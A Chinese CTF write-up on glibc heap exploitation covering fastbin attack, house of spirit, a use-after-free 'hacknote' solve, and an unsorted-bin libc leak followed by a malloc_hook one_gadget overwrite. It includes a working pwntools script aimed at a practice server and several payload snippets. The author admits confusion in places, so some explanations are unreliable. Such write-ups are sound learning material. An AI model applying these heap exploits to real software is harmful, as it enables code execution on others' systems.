[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191859-25f6806e-5106-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191859-25f6806e-5106-1.png)

由于 fastbin 的 fd 指针被指向了这个地方，所以本来我们只释放了一个 fastbinchunk，然后把它申请回来了，但是 fastbin 中还存在着一个 fake chunk，如果此时我们再申请一个 chunk，就会把这个申请过来，称作 fake chunk

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191910-2cf61e10-5106-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191910-2cf61e10-5106-1.png)

毕竟不是真 chunk，所以不会在 heap 中出现，但是它是真实存在的，就是 index=3

可以查看一下 heaparray 数组

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191921-33a6abe4-5106-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191921-33a6abe4-5106-1.png)

edit 修改数据，对地址内容进行修改

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129192111-75377fde-5106-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129192111-75377fde-5106-1.png)

而 0x6020bd 又正好在 heaparray 上面，那通过修改 index3 的数据，就可以对

0x6020bd 这个位置的内容进行修改，这个时候就可以用到堆溢出了。

把 index0 的内容写成 free_got 的地址，这个偏移就是 0x6020dd-0x6020b0+3 = 35

```
p8(0)*35 + p64(free_got)
```

调试看一下

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129192124-7caa76a4-5106-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129192124-7caa76a4-5106-1.png)

可以看到 index0 的地址已经被修改成 free_got 了。

那继续把 free_got 所指向的内容修改成 system，这样在调用 free_got 的时候，就会变成调用 system 了，并且 index1 的内容是 binsh

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129192132-8185a540-5106-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129192132-8185a540-5106-1.png)

直接调用 edit 修改 index0 就行了。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129192143-882b2fc8-5106-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129192143-882b2fc8-5106-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129192155-8f38610a-5106-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129192155-8f38610a-5106-1.png)

house of spirit
---------------

### 原理

通过任意地址 free 掉，达到改写任意地址

条件就是需要能够在目标地址附近建立一个 fake chunk。通过改写 fake chunk 来实现 getshell

先申请堆块，然后释放一个堆块到 bin，可以通过修改 fd 指针，伪造 0x7f 头越过 malloc 检测，从而将 fake chunk 取出。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129192821-74ee9fd4-5107-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129192821-74ee9fd4-5107-1.png)

这样其实 fake chunk 指向的 bss 段下的内容都变成可以控制的了，如果说 chunk 的地址保存在 bss 段上，就可以通过修改 fake chunk 所指向的内容来修改 chunk 的地址等内容。

可以劫持 got 表

之前初学堆的时候做过，重新做一遍。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129192830-7a6e3db6-5107-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129192830-7a6e3db6-5107-1.png)

程序分析
----

### add note

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129192933-a0004ef2-5107-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129192933-a0004ef2-5107-1.png)

### delete note

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129192942-a5551338-5107-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129192942-a5551338-5107-1.png)

### print note

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129192950-aa20cc36-5107-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129192950-aa20cc36-5107-1.png)

思路
--

uaf 漏洞，申请 2 个 chunk，然后释放它们，但是指针没有被改动，又因为 **(&notelist+i) 这个地址是 puts 函数

这个时候如果再申请一个 8 空间 chunk，会把刚刚释放的那个 8 空间 chunk 取回来，然后写入 content，对于这个 index 写的是 content，但是刚刚那个 8 空间的 chunk 里面存放的还是 puts 函数，它的 puts 就会被修改成 content。把 shell_addr 写进去再通过 print note 函数去调用 **(&notelist+i) 就变成了调用 shell。

脚本调试
----

```
from pwn import*

io=remote('node4.buuoj.cn',26946)
#io=process('./hacknote')

def add(size,content):
  io.sendlineafter('choice :','1')
  io.sendlineafter('Note size :',str(size))
  io.sendlineafter('Content :',content)

def delete(idx):
  io.sendlineafter('choice :','2')
  io.sendlineafter('Index :',str(idx))

def printf(idx):
  io.sendlineafter('choice :','3')
  io.sendlineafter('Index :',str(idx))

shell_addr=0x8048945

add(48,'aaaa')
add(48,'bbbb')
#gdb.attach(io)
delete(0)
#gdb.attach(io)
delete(1)
#gdb.attach(io)
add(8,p32(shell_addr))
#gdb.attach(io)
printf(0)

io.interactive()
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193102-d57ab810-5107-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193102-d57ab810-5107-1.png)

看看申请的 2 个 chunk

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193122-e0f76d6e-5107-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193122-e0f76d6e-5107-1.png)

一个 index 有 2 次申请，分别看看里面是什么东西

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193130-e5f3a0c6-5107-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193130-e5f3a0c6-5107-1.png)

0x080485fb 就是调用 puts 函数的区域

0x39 的 size 后面跟着 61616161 aaaa

然后看一下 free 掉之后

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193140-ebb16afc-5107-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193140-ebb16afc-5107-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193148-f0e4c960-5107-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193148-f0e4c960-5107-1.png)

再申请一个 chunk 写入 shell_addr

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193158-f69368e4-5107-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193158-f69368e4-5107-1.png)

我们重新申请的 8 空间大小的 chunk 的 content 就可以改写 shell_addr, 然后现在再调用一下这个被改写的成 shell 的 puts。

`print(0)`因为当前只有一个 index 了

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193207-fbb4392a-5107-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193207-fbb4392a-5107-1.png)

这题考察的是堆 chunk 内容中的 fasrbin attack。

fastbin attack 使用 double free 的方式先泄露出 libc_base。

逆向分析
----

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193305-1e5d43fe-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193305-1e5d43fe-5108-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193313-233cb62a-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193313-233cb62a-5108-1.png)

calloc 函数分配的 chunk 会被清 0，跟 malloc 有所不同。fill 函数如果往同一块内存写，可以覆盖其他的 chunk

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193322-28b38020-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193322-28b38020-5108-1.png)

内存分配的大小不能超过 4096

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193333-2f182790-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193333-2f182790-5108-1.png)

如果通过了 if(!v4) 的验证，就表示 chunk 被 calloc 创建了，然后让第一行这个指针为 1 表示成功创建。

第二行是 v3 也就是 chunk 的 size

第三行是 calloc 的返回值，那就是 chunk 的地址。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193342-346738da-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193342-346738da-5108-1.png)

result = 前面的那个指针 1 的时候才能说明这个 chunk 存在然后往下面进行数据填充

24LL*v3+a1+16 的地址表示的是目标 chunk 的地址，然后就是把 content 的内容写入地址中

**问题就存在没有限制 content 的大小（没有指明范围），可以实现堆溢出，然后把内容写入其他的 chunk 的指针中**

chunk 的数据结构如下

```
struct malloc_chunk{
    INTERNAL_SIZE_T mchunk_prev_size; 记录被释放的相邻chunk的大小。
    INTERNAL_SIZE_T mchunk_size;      记录当前chunk的大小，chunk的大小都是8字节对齐
    struct malloc_chunk *fd;
    struct malloc_chunk *bk;
    struct malloc_chunk *fd_nextsize;
    struck malloc_chunk *bk_nextsize; 
}
```

然后如果我们先申请两个 chunk，然后释放掉，再申请一个 chunk，这个时候就会从 fastbin chunk 的链表中挖走一个大小相符的 chunk。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193353-3b340c60-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193353-3b340c60-5108-1.png)

还是先判断 chunk 是否存在，如果存在，就把为 1 的那个指针为 0，让其他操作的判断失败。

然后再把 chunk 的 size 为 0，然后释放掉 content 内容的空间。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193402-404626ca-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193402-404626ca-5108-1.png)

先判断，然后按照 size 打印 content

思路
--

先使用 double free 的方法，把某个 chunk1 的内容部分，改写成某个 chunk2 的地址，这样在 dump 的时候实际上就是调用这个地址，然后如果可以通过把 chunk2 的地址通过 Fill 函数改成 backdoor 的地址，在调用 chunk1 内容的时候，就变成了可以 getshell。

然后这道题还是要泄露出 libc_base。在栈溢出的时候，我们可以通过 printf，put，write 去打印出某个函数当时的地址，然后通过计算偏移来算出 libc_base。 主要利用的是什么虽然地址是变化的，但是两者的相对位置是不变的（应该大概是这样的）

然后堆这边

```
unsorted bin 的意思是还没被处理的bin，被称作堆管理器的垃圾堆，chunk被释放之后，应该是先进入unsorted bin中等待我们再次分配内存，当它不为空的时候，申请非fastbin的内存的时候，我们就会先从unsorted bin中分割或分配。
main_arena 就是主线程的arena，就是主线程的一块区域，然后把start brk到brk这一块区域叫做堆
```

```
堆中计算libc_base，可以使用的是unsortbin存在一个bin时fd和bk指针的特性。大概长这样
stuck one_unsortbin{
    size;
    fd->unsorted bin head->main_arena+0x58
    bk->unsorted bin head->main_arena+0x58
}
然后main_arena对于libc有一个固定偏移0x3c4b20
那如果知道fd的值就可以
libc_base = fd_addr - 0x58 - 0x3c4b20
但是这种时候，unsortbin中有且只能有一个bin。就申请一个大于fastbin的值，让这个chunk释放之后进入unsorted bin中
```

那知道堆怎么搞出 libc_base 之后就要思考一下，怎么实现

先申请 2 个 fastbin 大小范围的 chunk，然后它们是线性排列的，由于 fill 函数没有指明范围，我们如果写的内容大小超过了单个 fastbin 大小 chunk 的范围，就会把内容写到下一个 chunk 的其他位置

```
chunk1  {
    key: 0 or 1;
    size: 0x....;
    content: xxxxx;  往这边写入content，然后如果它大于size，就会往下面chunk2的key，size进行填充。这就是堆溢出，溢出的地方，在chunk上面覆盖内容和修改。
}
chunk2 {
    key: 0 or 1;
    size:0x....;
    content: xxxxx;
}
```

现在知道了堆溢出的作用，我们的目的是求 libc_base，即求 unsorted bin 的 fd，即要修改某个 fastbin 大小的 chunk 的内容为 fd 指针地址，这样在调用 dump 函数的时候，就可以打印出 fd 的值。

然后计算出 libc 偏移后，使用 onegadget，将它写入 content，最后再申请它或者 dump 它。

脚本调试
----

首先先进行内存的申请

```
allocate(0x10) index0
allocate(0x10) index1
allocate(0x10) index2
allocate(0x10) index3
allocate(0x80) index4
```

前 4 个是 fastbin 大小的 chunk 第五个是 unsorted bin

再释放掉 1 2

```
free(1)
free(2)
```

让这 2 块先去 fastbin，gdb 调试看一下 fastbin 情况

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193421-4be6b292-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193421-4be6b292-5108-1.png)

尬住了，glibc 版本比较高，所以会先用 tcachebins，用完之后再用 fastbin，不过问题不是很大。（这边之前用 kail 做的，后面换成了 ubuntu1604 就没有问题了)

可以看到 02e0->02c0 相差 0x20 个位置，但是明明是只申请了 0x10 的空间，我觉得是因为 tcachebins 的范围最小是 0x20，所以小于 0x20 的 chunk 先进入，然后后面放空。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193432-52357eda-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193432-52357eda-5108-1.png)

虽然 free 掉了，但是状态还是使用。应该是 tcachebins 的特性吧。

可以看到 f2d0 的 fd 指向 f2c0 那就是 index2 的 fd 指针指向 index1 的 chunk，那就来通过堆溢出尝试一下修改

由于 index1 和 index2 被释放掉了

所以现在排列是

```
index0 -> index3 -index4
```

index4 的空间是 0x80，如果被释放的话是进入 unsorted bin 中，我们可以修改 index2 的 chunk 内容为 chunk4 的地址，这样就相当于 chunk4 被释放了，并且这个释放是在 fastbins 中的。就很神奇。

但是确实看不懂怎把 chunk 内容修改，就先调试一下看看堆溢出之后数据被放到哪儿。

`fill(0,p64(1)*8)`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193603-8866188e-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193603-8866188e-5108-1.png)

我是给 index0 开始填充 p64(1) 的，可以看到从 2a0 开始到 2d0 正好 8 个被我填充了 1，那再看一下，再往下填充 1 个位置啥情况

`fill(0,p64(1)*8+p8(1))`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193630-9881d0b4-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193630-9881d0b4-5108-1.png)

看到被释放的 index2 的 fd 不是指向 index1 的 chunk 了，最后 2 位变成了 01.

那就可以通过这样去修改 fd 指针指向 chunk4. 又因为需要修改 size 为 0x20，那就写 payload

`payload= p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)`这样写的话，意思就是

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193639-9e0987ca-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193639-9e0987ca-5108-1.png)

每个 chunk 0x20，溢出到下一位

然后因为 chunk3 的距离差 chunk4 0x80 个位置，所以将最后 2 位修改成 0x80

因为此时 chunk4 被 free 掉了，我等等还是要 malloc 回来使用的，但是 fastbin 会检查大小，所以还要再修改一下 chunk 的大小，

然后再把 fastbin 里面的 chunk1 chunk2 申请回来。

然后再申请再释放掉一个 unsortedbin 大小的内存，实际上就是把刚刚那个更改的 fd 指针指向 unsorted bin head 就是 main_arena.

```
allocate(0x10)
allocate(0x10)
payload = p64(0) * 3 + p64(0x91)    改写index4的size，真晕了，我gdb的时候有看到91.我看过去应该是size应该是先绕过一个fastbinsize然后再覆盖到unsortedbinsize
fill(3,payload)   
allocate(0x80)
free(4)   把我们刚刚一直再搞的那个东西给free掉，这样实际上是把那个0x80的放进了unsorted bin 是实际上
dump(2)   调用dump打印出fd的地址
```

后面就是接收 fd 的地址 (main_arena+0x58 地址) 然后计算 libc_base

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193654-a7125ae0-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193654-a7125ae0-5108-1.png)

然后把 shell=onegadget+libc_base

接下来就是如何调用这个 shell，通过 malloc_hook 上方错位构造大小 0x60 的 chunk，然后把 malloc_hook 的地址改写成 shell 的地址，这样在调用添加函数的 calloc 的时候就可以调用到 shell。

先把 chunk4 malloc 回来，然后修改成我们下一个申请 chunk 的地址，但是又因为 chunk2 的 fd 是 chunk4 的地址，所以第一次 calloc0x10 的时候是一句把 chunk2 给了 index1，第二次 calloc0x10 的时候就把 chunk4 给 index2 了，因为 fastbin 单链表的特点，那么 index2 4 其实都是在使用 chunk4

```
allocate(0x60)
allocate(0x60)        看不懂啊，这个申请0x60，然后改它的末位位0.可能是malloc函数的函数结构太不熟悉了
payload = p8(0)*3     估计涉及到malloc_hook的一些结构。
payload += p64(0)*2
payload += p64(libc_base+0x4526a)
fill(6, payload)
allocate(0x80)
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193816-d819c07e-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193816-d819c07e-5108-1.png)